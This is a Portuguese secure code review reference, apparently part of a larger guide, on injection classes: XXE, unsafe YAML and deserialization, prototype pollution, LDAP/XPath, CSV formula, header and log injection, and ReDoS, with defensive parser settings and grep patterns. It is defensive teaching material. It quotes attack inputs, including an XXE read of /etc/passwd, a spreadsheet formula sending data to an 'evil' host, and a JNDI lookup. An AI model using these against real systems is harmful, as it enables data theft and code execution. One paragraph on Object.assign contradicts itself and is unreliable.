| **SpEL** | Spring | `#{...}` avaliado com `SpelExpressionParser` sobre input; também `@Value` e `@PreAuthorize` com string concatenada. Use `SimpleEvaluationContext` em vez de `StandardEvaluationContext` |
| **MVEL** | Java | Usado em motores de regra (Drools) — expressão vinda de config editável é RCE |
| **Groovy** `Eval`/`GroovyShell` | Java | Idem; `SecureASTCustomizer` ajuda mas não é hermético |

Padrão de revisão: em Java, motor de regra/workflow/relatório com expressão editável em runtime é sempre uma superfície de RCE. Trate o editor de regras como um console de administração e proteja com autorização forte (veja `references/autorizacao-e-logica-de-negocio.md`).

---

## 7. XXE e ataques a parsers de dados

### 7.1 XML External Entity

O parser XML resolve entidades declaradas na DTD. Uma entidade **externa** aponta para um recurso — arquivo local ou URL:

```xml
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<r>&x;</r>
```

Impactos: leitura arbitrária de arquivo (`/etc/passwd`, `/proc/self/environ`, chave privada, `application.yml`), **SSRF** (o parser faz a requisição de dentro da rede — cadeia com `references/ssrf-e-camada-http.md`), DoS e, em PHP com wrapper `expect://`, execução.

**Variantes que você precisa reconhecer:**

- **Billion laughs / DoS de expansão**: entidades aninhadas que expandem exponencialmente. Não precisa de entidade externa — é bloqueado só por limite de expansão ou por proibir DTD.
- **XXE cego por DTD externa (OOB)**: sem output, o atacante hospeda uma DTD que define uma entidade-parâmetro construindo uma URL com o conteúdo do arquivo. Detectado com OAST.
- **XXE cego por erro**: a entidade aponta para caminho inexistente construído com o conteúdo do arquivo, e a **mensagem de erro** vaza o conteúdo.
- **XXE por formato que "não é XML"**: **SVG** (upload de avatar processado por ImageMagick/rsvg/Batik), **DOCX/XLSX/PPTX** (são ZIPs de XML — parsers de planilha são um vetor recorrente), **SOAP**, **XML-RPC**, **SAML** (assertion é XML — e aqui XXE se combina com XML Signature Wrapping), **RSS/Atom**, **KML/GPX**, **XLIFF**, **SVG dentro de PDF**.
- **XInclude**: quando você não controla o DOCTYPE mas controla um elemento, `<xi:include href="file:///...">` pode servir.

### 7.2 Configuração segura por parser — flags exatas

**Java** ([OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)):

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// defesa primária — se você não precisa de DTD, isto sozinho resolve
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// se precisar de DTD, então estas três:
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

- `SAXParserFactory` / `SAXReader`: mesmas quatro features.
- `XMLInputFactory` (StAX): `setProperty(XMLInputFactory.SUPPORT_DTD, false)` e `setProperty("javax.xml.stream.isSupportingExternalEntities", false)`.
- `TransformerFactory`: `setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "")` e `ACCESS_EXTERNAL_STYLESHEET, ""`.
- `SchemaFactory`/`Validator`: `ACCESS_EXTERNAL_DTD, ""` e `ACCESS_EXTERNAL_SCHEMA, ""`.
- `XMLConstants.FEATURE_SECURE_PROCESSING` ajuda contra expansão de entidade mas **não** desliga entidade externa sozinho.

**.NET**: `XmlReader`, `XmlNodeReader`, `XmlDictionaryReader` e `XDocument` são seguros por padrão a partir do **.NET Framework 4.5.2**. Em versões anteriores, ou em `XmlDocument`, defina `XmlResolver = null`; em `XmlTextReader`, `DtdProcessing = DtdProcessing.Prohibit`.

**Python**: use [`defusedxml`](https://pypi.org/project/defusedxml/) — os parsers da stdlib (`xml.etree`, `minidom`, `sax`, `lxml`) não protegem contra billion laughs / quadratic blowup, mesmo que entidade externa já esteja desligada por padrão em `xml.etree` moderno. Em `lxml`, `etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)`.

**PHP**: em PHP ≥ 8.0 a resolução de entidade externa por libxml está desligada por padrão. Em versões anteriores, `libxml_set_external_entity_loader(null)` (`libxml_disable_entity_loader` está deprecado desde 8.0). Nunca passe `LIBXML_NOENT`.

**C/libxml2**: seguro por padrão a partir da **2.9**; o perigo é reativar com `XML_PARSE_NOENT`, `XML_PARSE_DTDLOAD` ou `XML_PARSE_DTDVALID`.

**Node**: não há parser XML na stdlib. `fast-xml-parser` **não processa DTD/entidade externa** (processa apenas entidades customizáveis via `processEntities`), o que o torna a escolha padrão segura; `libxmljs`/`libxmljs2` são bindings de libxml2 e podem ser configurados de forma insegura (`noent: true`) — e `libxmljs` teve CVEs de corrupção de memória. `xml2js` é seguro quanto a XXE mas **teve prototype pollution** (CVE-2023-0842) — cruzamento com §9.

**Regra de revisão simples:** se você só precisa ler XML de dados, `disallow-doctype-decl` (ou equivalente) é a única flag que importa. Ela mata XXE, billion laughs, XInclude por DTD e parameter entity de uma vez.

### 7.3 YAML

YAML não é "JSON com menos chaves": a especificação inclui **tags** que instanciam objetos da linguagem hospedeira. Isso torna `load` inseguro um desserializador (§8).

- **Python/PyYAML**: `yaml.load(data)` com `Loader=yaml.UnsafeLoader`/`FullLoader` construía objetos arbitrários via `!!python/object/apply:os.system`. Use **`yaml.safe_load`** (ou `Loader=yaml.SafeLoader`). Desde PyYAML 5.1 `yaml.load` sem `Loader` emite warning; `FullLoader` teve bypasses ([CVE-2020-1747](https://nvd.nist.gov/vuln/detail/CVE-2020-1747), [CVE-2020-14343](https://nvd.nist.gov/vuln/detail/CVE-2020-14343)) — não confie nele, use `safe_load`.
- **Node/js-yaml**: na **v4**, `yaml.safeLoad` foi **removido** e `yaml.load` passou a ser seguro por padrão (schema core, sem tipos que constroem função). Na v3 o default era `DEFAULT_FULL_SCHEMA`, que suportava `!!js/function` — RCE. Se você vê `yaml.load(x, { schema: yaml.DEFAULT_FULL_SCHEMA })` ou `js-yaml@^3` com `load`, é achado. A mensagem de erro `Function yaml.safeLoad is removed in js-yaml 4` no log indica migração incompleta, não vulnerabilidade.
- **Java/SnakeYAML**: `new Yaml()` usa `Constructor` que instancia classes arbitrárias (`!!javax.script.ScriptEngineManager` é a gadget clássica). Use `new Yaml(new SafeConstructor())`. A partir do **SnakeYAML 2.0** o default do construtor padrão passou a ser seguro (não desserializa tipos globais arbitrários) — confirme a versão em `pom.xml`.
- **Go**: `gopkg.in/yaml.v3` e `goccy/go-yaml` não instanciam tipos arbitrários; o risco lá é billion laughs (yaml.v3 tem limite) e alocação sem limite.

### 7.4 JSON, e por que ele geralmente está bem

`JSON.parse` não executa código e não instancia classes. As armadilhas reais:

- **Prototype pollution não acontece no `JSON.parse`** — ele cria `__proto__` como propriedade **própria** (via `CreateDataProperty`, que não dispara setter). A poluição acontece no **passo seguinte**, no merge. Detalhe importante para não gerar falso positivo (§9, §12).
- **Reviver com efeito colateral**: `JSON.parse(s, (k,v) => { target[k] = v })` é o merge perigoso disfarçado.
- **Limite de tamanho e profundidade**: sem `bodyLimit`/`limit`, um JSON de 500 MB é DoS. No Fastify, `bodyLimit` (default 1 MiB); no Express, `express.json({ limit: '100kb' })`.
- **Duplicidade de chave e diferença entre parsers** é a raiz de bugs de *parser differential* (o serviço A valida uma chave, o serviço B lê a outra) — relevante para autorização, veja `references/api-e-graphql.md`.
- **Desserializadores JSON com type hint** (Jackson `enableDefaultTyping`/`@JsonTypeInfo`, `fastjson` `autoType`, `Newtonsoft` `TypeNameHandling != None`) **são** desserialização insegura de pleno direito. Veja §8.

---

## 8. Desserialização insegura

### 8.1 Por que é RCE e não "corrupção de dado"

Formatos de serialização nativos não guardam só valores: guardam **qual classe reconstruir**. O desserializador instancia a classe indicada no fluxo e chama métodos de reconstrução dessa classe — `readObject`/`readResolve` em Java, `__wakeup`/`__destruct`/`__toString` em PHP, `__reduce__`/`__setstate__` em Python, `[OnDeserialized]` em .NET. Esses métodos são **código da aplicação e das dependências**, executado antes de qualquer validação da sua camada de negócio.

O atacante não injeta código novo: ele encadeia código que **já está no classpath** — uma *gadget chain*. Por isso "eu não desserializo nada perigoso" é irrelevante: o perigo está nas suas dependências. E por isso adicionar uma biblioteca pode criar uma cadeia onde não havia.

### 8.2 Por linguagem

| Linguagem | Sink | Gadgets/notas |
|---|---|---|
| **Java** | `ObjectInputStream.readObject()`, `XMLDecoder.readObject()`, `SnakeYAML`, Jackson com default typing, `fastjson` `autoType`, JMS/RMI/JNDI | [`ysoserial`](https://github.com/frohoff/ysoserial) cataloga as cadeias: Commons-Collections 3.1/4.0, Spring, Groovy, Hibernate, Rome, C3P0, Beanshell |
| **PHP** | `unserialize()` | POP chains via `__destruct`/`__wakeup`/`__toString`. **Phar deserialization**: qualquer operação de filesystem sobre `phar://path` desserializa os metadados do phar — `file_exists`, `is_dir`, `getimagesize` viram sinks. Combina com upload de "imagem" (polyglot GIF/phar) |
| **Python** | `pickle.loads`, `pickle.load`, `dill`, `shelve`, `joblib`, `numpy.load(allow_pickle=True)`, `torch.load` sem `weights_only=True`, `pandas.read_pickle` | `__reduce__` retorna `(callable, args)` — é literalmente "execute isto". Fundamental para modelos de ML baixados: veja `references/supply-chain-e-cicd.md` e `references/llm-e-ia.md` |
| **.NET** | `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer`, `LosFormatter` (ViewState), `ObjectStateFormatter`, `JavaScriptSerializer` com `SimpleTypeResolver`, `Newtonsoft.Json` com `TypeNameHandling` ≠ `None` | `BinaryFormatter`: obsoleto (**SYSLIB0011**) desde **.NET 5**; lança `NotSupportedException` em runtime por padrão desde **.NET 8**; **implementação removida do produto no .NET 9** (as APIs existem e sempre lançam). Se alguém referenciou o pacote de compatibilidade `System.Runtime.Serialization.Formatters` para trazer de volta, é achado. `ysoserial.net` cataloga as cadeias |
| **Ruby** | `Marshal.load`, `YAML.load` (Psych < 4 default inseguro; Psych 4 tornou `YAML.load` = `safe_load`), `Oj` sem `mode: :strict` | Cadeias universais publicadas para Rails |
| **Node** | `node-serialize` (`unserialize` executa IIFE em função serializada), `serialize-javascript` (é **serializador**, com CVE de XSS em escape — não desserializa), `funcster`, `cryo` | Menos comum, mas `node-serialize` ainda aparece em código legado |

### 8.3 Identificar formato serializado no tráfego

Útil quando o parâmetro parece opaco (cookie, ViewState, campo `state`, mensagem de fila):

| Formato | Bytes iniciais | Base64 começa com |
|---|---|---|
| Java `ObjectOutputStream` | `AC ED 00 05` | `rO0AB` |
| Java serializado + gzip | `1F 8B` | `H4sI` |
| PHP `serialize()` | `O:<n>:"`, `a:<n>:{`, `s:<n>:` | frequentemente legível sem base64 |
| Python pickle protocolo 2 | `80 02` | `gAJ` |
| Python pickle protocolo 4 | `80 04 95` | `gASV` |
| .NET `BinaryFormatter` | `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` |
| ASP.NET ViewState | — | `/wEP` (frequentemente) |
| Ruby `Marshal` | `04 08` | `BAg` |

Se um desses aparece em algo que o cliente pode alterar, o achado é **crítico até prova em contrário** — a exploração depende só de haver gadget no classpath.

### 8.4 Defesas

1. **Não desserialize formato nativo vindo de fora.** Regra número um. Troque por JSON/Protobuf/MessagePack com **schema explícito**, mapeando campo a campo para um DTO. É a única correção que remove a classe.
2. **Allowlist de classe** quando não há alternativa (integração legada):
   - Java: `ObjectInputFilter` (JEP 290, JDK 9; **backportado** para 8u121, 7u131 e 6u141). Filtro global via propriedade `jdk.serialFilter`, por stream via `ObjectInputStream.setObjectInputFilter`, e filtros por contexto via `ObjectInputFilter.Config.setSerialFilterFactory` (JEP 415, **JDK 17**). Padrão de filtro do tipo `maxdepth=10;maxarray=1000;com.exemplo.dto.*;!*` — allowlist terminada em `!*`.
   - .NET: não há allowlist confiável para `BinaryFormatter` — a resposta é migrar (é por isso que a Microsoft removeu).
   - Python: `pickle.Unpickler` com `find_class` sobrescrito é a única forma; ainda assim, prefira não usar pickle.
3. **Assine e verifique com HMAC** quando o payload precisa fazer round-trip pelo cliente (cookie de sessão, ViewState). Verifique a assinatura **antes** de desserializar, com comparação em tempo constante. Detalhes de HMAC e chaves em `references/criptografia-e-segredos.md`. Nunca use isso como *única* defesa em formato nativo: uma chave vazada vira RCE direta (o histórico do `MachineKey` do ASP.NET é exatamente isso).
4. **Nunca `torch.load`/`numpy.load`/`joblib.load` de modelo de terceiro** sem `weights_only=True` ou formato safetensors.
5. **Monitore**: log de exceção de desserialização com classe inesperada é um dos sinais mais limpos de tentativa de ataque (`references/threat-modeling-e-severidade.md`).

---

## 9. Prototype pollution

A injeção mais característica do stack Node/TypeScript. [CWE-1321](https://cwe.mitre.org/data/definitions/1321.html).

### 9.1 Mecanismo

Em JavaScript, `obj.__proto__` é um **acessor herdado de `Object.prototype`** cujo setter troca o protótipo do objeto. Toda operação de escrita por chave dinâmica (`target[key] = value`) dispara esse setter quando `key === '__proto__'`. Como quase todo objeto herda de `Object.prototype`, escrever ali contamina **todos os objetos do processo**.

```js
const target = {}
target['__proto__']['isAdmin'] = true    // ou um merge recursivo com {"__proto__":{"isAdmin":true}}
;({}).isAdmin                             // → true, em qualquer objeto novo
```

Dois caminhos: `__proto__` e `constructor.prototype` (funciona mesmo com `--disable-proto=delete`, porque `constructor` e `prototype` são propriedades normais).

**Ponto que evita falso positivo:** `JSON.parse('{"__proto__":{"a":1}}')` **não polui** — cria uma propriedade *própria* chamada `__proto__`, porque a spec usa `CreateDataProperty` (não dispara setter). Igualmente, `Object.assign` **superficial** não polui (usa `Set` mas com `__proto__` como própria chave do source... na prática `Object.assign({}, JSON.parse(...))` **polui**, pois `Set` no target dispara o setter herdado). A poluição acontece quando o objeto parseado é **copiado por atribuição** para outro objeto. Portanto: `JSON.parse` sozinho = não é bug; `JSON.parse` + merge = é bug.

### 9.2 Entradas típicas

| Vetor | Detalhe |
|---|---|
| Merge/clone recursivo escrito à mão | `function merge(a,b){ for (const k in b) { if (typeof b[k]==='object') merge(a[k],b[k]); else a[k]=b[k] } }` — o exemplo canônico |
| `lodash.merge`, `mergeWith`, `defaultsDeep`, `set`, `setWith`, `zipObjectDeep` | [CVE-2019-10744](https://github.com/advisories/GHSA-jf85-cpcp-j695) (`defaultsDeep`, corrigido em **4.17.12**), [CVE-2020-8203](https://github.com/advisories/GHSA-p6mc-m468-83gw) (`zipObjectDeep`/`set`, corrigido em **4.17.20**) |
| Parser de query string | `?__proto__[isAdmin]=1` e `?constructor[prototype][x]=1`. O `qs` (parser default do Express com `extended`) teve [CVE-2022-24999](https://github.com/advisories/GHSA-hrpp-h998-j3pp) — `a[__proto__]=b&a[length]=1e8` travava o processo; corrigido em **6.10.3** com backports para 6.9.7/6.8.3/6.7.3/6.6.1/6.5.3/6.4.1/6.3.3/6.2.4, e o Express 4.17.3 já traz o `qs` corrigido |
| Parsers de config/dados | `xml2js` (CVE-2023-0842), parsers de `.env`, `ini`, `dot-prop`, `flat`, `deep-set`, `immer` antigo |
| Body multipart / campos com bracket notation | `body-parser` + `qs` com `extended: true` |
| `Object.entries(req.body)` alimentando escrita dinâmica | Mesma coisa que merge |
| Cliente | `location.hash`/`search` → parser próprio → gadget de DOM XSS. Veja `references/xss-e-navegador.md` |

### 9.3 Do DoS ao RCE — os gadgets

Poluir só cria a propriedade; o impacto vem de **algum código que lê uma propriedade que normalmente não existe** e muda de comportamento. Isso é o "gadget".

- **DoS** (o mais fácil): poluir `Object.prototype.length`, `Object.prototype.toString` ou uma chave que quebre um iterador derruba o processo.
- **Bypass de lógica/autorização**: `Object.prototype.isAdmin = true`, `role = 'admin'`, ou poluir um campo checado com `if (opts.skipAuth)`. Sem crash, sem log — e é o impacto mais comum na prática.
- **RCE via `child_process`**: as opções de `spawn`/`exec`/`fork` são um objeto lido com defaults. Poluir `Object.prototype.shell = '/bin/sh'` faz um `spawn` que era sem shell passar a usar shell; poluir `Object.prototype.env`, `NODE_OPTIONS` (para carregar um `--require`) ou `execArgv` de `fork` leva a execução.
- **RCE via template engine**: [CVE-2022-29078](https://nvd.nist.gov/vuln/detail/CVE-2022-29078) no EJS — poluir `Object.prototype.outputFunctionName` faz o EJS interpolar aquela string no corpo da função compilada. Pug, Handlebars e Jade têm gadgets análogos.
- **Bypass de validação/config**: poluir defaults de Ajv, de `cookie`, de `undici`/`axios` (headers), do parser de `Content-Type`.

O guia de exploração server-side (incluindo como detectar sem crashar a aplicação) está em [PortSwigger — Server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side). Uma técnica de detecção não destrutiva vale citar em relatório: poluir uma opção *inócua* que muda a saída observável, como `Object.prototype.json spaces` (Express respeita `json spaces` e a resposta passa a vir indentada) — evidência clara e sem efeito colateral.

### 9.4 Defesa

| Medida | O que resolve | Limite |
|---|---|---|
| Validação com schema (Zod/Ajv com `additionalProperties: false`) | Melhor custo-benefício: chave desconhecida nunca chega ao merge | Precisa cobrir todos os endpoints |
| `Object.create(null)` para mapas/dicionários | O objeto não herda de `Object.prototype`, então `__proto__` é chave comum | Só protege *aquele* objeto |
| `new Map()` em vez de objeto como dicionário | Chaves não interagem com protótipo | Mudança de API |
| `Object.freeze(Object.prototype)` no bootstrap | Impede a escrita — mitigação global forte | Pode quebrar libs que estendem protótipos; teste. Não congela `Array.prototype` etc. |
| `--disable-proto=delete` (ou `=throw`, que lança `ERR_PROTO_ACCESS`) | Remove o acessor `__proto__` | **Não** bloqueia `constructor.prototype` |
| `structuredClone(obj)` em vez de merge manual | Clona sem disparar setters e sem copiar protótipo | Não faz merge; falha em funções/classes |
| Guarda explícita no merge | `if (k === '__proto__' \|\| k === 'constructor' \|\| k === 'prototype') continue` | Frágil se esquecerem um caso; use lib mantida |
| `JSON.parse` + `Object.hasOwn` em vez de `for...in` | `for...in` percorre a cadeia de protótipos | |

### 9.5 Caçar em revisão

```bash
# merges e escritas dinâmicas
grep -rn --include='*.ts' --include='*.js' -E "\b(merge|mergeWith|defaultsDeep|setWith|zipObjectDeep|extend|deepExtend|deepAssign)\(" src/
grep -rn --include='*.ts' -E "for \(const \w+ in " src/          # for..in percorre o protótipo
grep -rn --include='*.ts' -E "\w+\[[A-Za-z_$][\w$]*\]\s*=" src/  # escrita por chave dinâmica
grep -rn -E "__proto__|constructor\s*\[|\['prototype'\]" src/
grep -rn -E "JSON\.parse\([^)]*,\s*(function|\()" src/           # reviver
```

Sinal forte: função recursiva de 8 linhas chamada `merge`/`deepMerge`/`assignDeep` escrita na mão. Quase sempre sem a guarda.

---

## 10. Outras injeções que aparecem em revisão

### 10.1 LDAP injection ([CWE-90](https://cwe.mitre.org/data/definitions/90.html))

Filtros LDAP usam notação prefixa: `(&(uid=joao)(userPassword=x))`. Injetar `*)(uid=*))(|(uid=*` transforma a árvore booleana e permite bypass de autenticação ou enumeração completa do diretório.

Dois contextos com escapes **diferentes**, e confundi-los é um bug comum:
- **Filtro** (RFC 4515): escape hex de `\ ( ) * NUL` → `\5c \28 \29 \2a \00`.
- **DN** (RFC 4514): escape de `\ , + " < > ; #` e espaço inicial/final.

Em Java, use `javax.naming.directory.SearchControls` com filtro parametrizado (`search(base, "(uid={0})", new Object[]{uid})`) — o JNDI faz o escape correto. Em Node, `ldapjs` tem `filter.escape`/`ldapEscape`. Em Python, `ldap3` tem `escape_filter_chars` e `escape_rdn`. Nunca concatene.

### 10.2 XPath / XQuery injection ([CWE-643](https://cwe.mitre.org/data/definitions/643.html))

`//user[name='$n' and pass='$p']` com `' or '1'='1` — mesma mecânica do SQL, sem tabela de privilégio para limitar impacto (XPath 1.0 não tem controle de acesso: o atacante lê o documento inteiro). Use API de variável: `XPathExpression` com `XPathVariableResolver` em Java, `etree.XPath(expr, smart_strings=False)` com `**kwargs` em lxml. Vetor comum: autenticação contra XML, filtros em configuração XML, XSLT com parâmetro do usuário.

### 10.3 CSV / formula injection ([CWE-1236](https://cwe.mitre.org/data/definitions/1236.html))

Impacto real e frequentemente subestimado: o dado sai íntegro da sua aplicação, mas **o Excel/LibreOffice/Google Sheets do funcionário interpreta a célula como fórmula**. Um campo "nome da empresa" contendo `=cmd|'/c calc'!A0` ou `=HYPERLINK("https://evil/?d="&A1,"clique")` vira exfiltração ou execução na máquina de quem abre o relatório — atravessa a fronteira do navegador e do seu modelo de ameaça.

Caracteres de início de célula que disparam interpretação: `=`, `+`, `-`, `@`, e também **TAB (0x09)**, **CR (0x0D)** e **LF (0x0A)** no início.

Defesa: ao exportar, se a célula começa com um desses, prefixe com aspa simples `'` (Excel trata como texto) **ou** com um espaço, e sempre envolva o valor em aspas duplas com `"` interno duplicado. Nunca dependa de o cliente ter macro desabilitada. Melhor ainda: exporte **XLSX** com o tipo de célula explicitamente `inlineStr`/string, o que remove a ambiguidade — bibliotecas como `exceljs` e `openpyxl` permitem forçar isso. Sirva com `Content-Type: text/csv` e `Content-Disposition: attachment`.

### 10.4 CRLF injection / response splitting / header injection ([CWE-93](https://cwe.mitre.org/data/definitions/93.html))

Injetar `\r\n` num valor de header permite terminar o header e escrever headers próprios ou um corpo de resposta inteiro (response splitting), tipicamente via `Location:` de redirect ou header de cookie montado à mão.

**Estado atual em Node:** o core do HTTP rejeita CR/LF em `setHeader` com `ERR_INVALID_CHAR`, então response splitting puro em Node é raro. Continua havendo problemas em (a) validação inconsistente de caracteres não-UTF8, (b) clientes HTTP — a `undici`/`fetch` já teve CRLF injection em header `host` e no `upgrade`; (c) proxies e frameworks que montam a resposta fora do core; (d) **request splitting/smuggling**, que é assunto de `references/ssrf-e-camada-http.md`.

Defesa: rejeite `\r`, `\n` e `%0d`/`%0a` em qualquer valor que vá para header, e não construa header por concatenação de string.

### 10.5 SMTP / e-mail header injection

Formulário de contato que coloca `req.body.email` no `From:`/`Reply-To:`: injetar `\nBcc: vitima@x` transforma seu servidor em relay de spam/phishing com a reputação do seu domínio. Também `\n\n` fecha os headers e permite escrever o corpo. Em Node, `nodemailer` valida os campos de endereço; o risco está em quem monta o header cru ou usa `headers: { ... }` com valor do usuário. Nunca ponha input do usuário em campo de endereçamento — coloque no **corpo**, e use um `From:` fixo do seu domínio com `Reply-To` validado por regex estrita de e-mail.

### 10.6 Log injection e "o log é um interpretador" ([CWE-117](https://cwe.mitre.org/data/definitions/117.html))

Nível 1 — **forjar entrada de log**: um username com `\n` cria linhas falsas ("2026-08-01 INFO login sucesso user=admin"), destruindo a integridade da trilha de auditoria e envenenando alertas. Também quebra parser de SIEM. Defesa: log **estruturado em JSON** (pino, zap, structlog) — o valor vira campo escapado e o `\n` não cria linha nova. Isso resolve o problema por construção, sem sanitizar nada. Complementa `references/threat-modeling-e-severidade.md`.

Nível 2 — **o formatador de log interpreta o dado**: [Log4Shell / CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) (CVSS 10.0). O Log4j 2 expandia `${...}` **dentro da mensagem logada**, incluindo `${jndi:ldap://...}`, que fazia lookup JNDI e carregava uma classe remota — RCE não autenticada, alcançável por qualquer campo que fosse logado (User-Agent, nome de usuário, campo de formulário). Sequência de correções: 2.15.0 (incompleta), 2.16.0 (remove message lookups), 2.17.0 (CVE-2021-45105, DoS recursivo), 2.17.1 (CVE-2021-44832, JDBC Appender). A lição estrutural: **o log é um sink** como qualquer outro; se o formatador tem uma linguagem de expressão, dado do usuário na mensagem é injeção. Sempre logue valor como **parâmetro/campo**, nunca concatenado na string de formato.

Nível 3 — **ANSI escape injection**: sequências `\x1b[` no log manipulam o terminal de quem faz `tail`, podendo esconder linhas ou, em terminais com features perigosas, injetar comando na linha de entrada. Escape de caracteres de controle antes de escrever em TTY.

### 10.7 Injeção em `Content-Disposition` (nome de arquivo)

`Content-Disposition: attachment; filename="${name}"` com `name` contendo `"` permite injetar parâmetros no header (e, se CR/LF passar, headers inteiros). Consequências práticas: mudar o nome/extensão salvo pela vítima (`.html` → XSS armazenada quando o arquivo é aberto do disco no mesmo origin; `.exe`) ou quebrar o parsing do navegador.

Defesa (RFC 6266 + RFC 5987): use `filename*=UTF-8''<pct-encoded>` para o nome real, mantenha um `filename="download"` ASCII sanitizado como fallback, e faça percent-encoding de tudo fora de `[A-Za-z0-9._-]`. Combine com `X-Content-Type-Options: nosniff` e sirva uploads de um domínio separado (veja `references/xss-e-navegador.md`).

### 10.8 ReDoS — injeção de complexidade ([CWE-1333](https://cwe.mitre.org/data/definitions/1333.html))

O atacante não injeta sintaxe: injeta **entrada que faz o motor de regex backtracking explodir**. Engines com backtracking (JS `RegExp`, Java, Python `re`, PCRE, .NET) tentam todas as formas de casar; com quantificador aninhado ou alternância sobreposta o número de tentativas é exponencial no tamanho da entrada. Em Node, que é single-threaded, uma requisição trava **todo o processo**.

Padrões catastróficos a reconhecer em revisão:

| Padrão | Exemplo | Entrada que mata |
|---|---|---|
| Quantificador aninhado | `(a+)+$` , `(\d+)*$` | `'a'.repeat(40) + '!'` |
| Alternância sobreposta sob quantificador | `(a\|a)+`, `(\s\|\t)*$` | espaços seguidos de caractere não casante |
| `.*` repetido com âncora no fim | `^(.*,)*.*$` | linha longa sem o terminador |
| Validador de e-mail "completo" | `^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$` | e-mail longo sem TLD válido — este exemplo está na lista OWASP e ainda circula copiado |
| Trim com regex | `^\s+\|\s+$` sobre string enorme | menos grave, mas mensurável |

Defesas:
- **Motor sem backtracking**: `re2` (bindings nativos do RE2 em Node) ou `re2js` (porte puro JS, sem etapa de compilação nativa — relevante porque, desde o **npm 12 (julho de 2026)**, scripts de instalação de dependência só rodam se o pacote estiver em `allowScripts` no `package.json`, o que quebra instalações silenciosas de `re2`). Em Go e Rust os motores da stdlib (`regexp`, crate `regex`) já são lineares por construção — ReDoS ali não existe.
- **Limitar tamanho da entrada antes do match** (`if (s.length > 256) reject`). Barato e resolve a maioria dos casos, porque a explosão é exponencial no comprimento.
- **Timeout**: .NET tem `Regex` com `matchTimeout`; Java não tem nativo; Node não tem — use worker thread com timeout, ou o motor linear.
- **Ferramentas**: regra `security/detect-unsafe-regex` do ESLint, `safe-regex2`, `recheck`, e o CodeQL query `js/redos`. Note que o `--regexp` de scanners tem falso positivo alto: um regex catastrófico aplicado só a constante do próprio código não é vulnerabilidade.

Regex **vinda do usuário** (busca com "usar expressão regular", filtro de admin) é ainda pior: é injeção direta de complexidade e, em alguns motores, de comportamento. Se o produto exige, compile com RE2.

---

## 11. Sinais em revisão de código

### 11.1 Tabela de sinks por linguagem

| Classe | Linguagem/Framework | Sink | `grep -rn` |
|---|---|---|---|
| SQL | Node/Prisma | `$queryRawUnsafe`, `$executeRawUnsafe`, `Prisma.raw` | `grep -rnE '\$(query\|execute)RawUnsafe\|Prisma\.raw\(' src/` |
| SQL | Node/TypeORM | `.query(`, `Raw(`, `.orderBy(` | `grep -rnE '\.query\(`\|\bRaw\(\|orderBy\(\s*[a-z]' src/` |
| SQL | Node/Sequelize | `Sequelize.literal`, `sequelize.query` sem `replacements` | `grep -rnE 'literal\(\|sequelize\.query\(' src/` |
| SQL | Node/Knex | `whereRaw`, `orderByRaw`, `havingRaw`, `joinRaw`, `knex.raw` | `grep -rnE '(where\|orderBy\|having\|join)Raw\(\|knex\.raw\(' src/` |
| SQL | Node/Drizzle | `sql.raw(`, `sql.identifier(`, `.as(` | `grep -rnE 'sql\.raw\(\|sql\.identifier\(' src/` |
| SQL | Go | `fmt.Sprintf` perto de `Query`/`Exec`/`Raw` | `grep -rnE '(Query\|Exec\|Raw)\w*\(\s*fmt\.Sprintf' .` |
| SQL | Java | `Statement.execute*`, `createQuery` com `+` | `grep -rnE 'createStatement\(\)\|createQuery\("[^"]*"\s*\+' .` |
| SQL | Python | `cursor.execute(f"`, `.raw(`, `.extra(` | `grep -rnE 'execute\(\s*f["\x27]\|\.raw\(\|\.extra\(' .` |
| SQL | PHP | `->query(`, `mysqli_query`, `$pdo->exec` com `$` | `grep -rnE '(query\|exec)\(\s*["\x27][^"\x27]*\$' .` |
| NoSQL | Node/Mongo | `find(req.`, `$where`, `$function`, `$accumulator` | `grep -rnE 'find\w*\(\s*req\.\|\$where\|\$function' src/` |
| Comando | Node | `exec(`, `execSync(`, `shell: true` | `grep -rnE "child_process|\bexec(Sync)?\(|shell:\s*true" src/` |
| Comando | Python | `shell=True`, `os.system`, `os.popen` | `grep -rnE 'shell\s*=\s*True\|os\.(system\|popen)\(' .` |
| Comando | Go | `exec.Command("sh"` / `"bash"` | `grep -rnE 'exec\.Command\(\s*"(sh\|bash\|cmd)"' .` |
| Comando | Java/PHP/Ruby | `Runtime.exec`, `shell_exec`, backticks | `grep -rnE 'Runtime\.getRuntime\(\)\.exec\|shell_exec\|passthru\|proc_open' .` |
| Argument inj. | qualquer | binário + arg do usuário sem `--` | revise manualmente todo `execFile`/`spawn` cujo array contenha variável |
| SSTI | Node | `ejs.render(`/`compile(` com template variável, `pug.compile`, `Handlebars.compile` | `grep -rnE '(ejs\|pug\|nunjucks\|handlebars\|hbs)\.(render\|compile)\(\s*[a-z_$]' src/` |
| SSTI | Python | `Template(`, `render_template_string` | `grep -rnE 'render_template_string\|Template\(\s*[a-z_]' .` |
| SSTI | Java | `new Template(`, `FreeMarker`, `TemplateEngine.process` com string | manual |
| eval | Node | `eval(`, `new Function(`, `vm.run`, `setTimeout('` | `grep -rnE '\beval\(\|new Function\(\|vm\.(run\|Script)\|setTimeout\(\s*["\x27]' src/` |
| eval | Java | `SpelExpressionParser`, `Ognl.getValue`, `MVEL.eval`, `GroovyShell` | `grep -rnE 'SpelExpressionParser\|Ognl\.\|MVEL\.\|GroovyShell' .` |
| XXE | Java | `DocumentBuilderFactory.newInstance()` sem `setFeature` logo depois | `grep -rn -A5 'DocumentBuilderFactory.newInstance' .` |
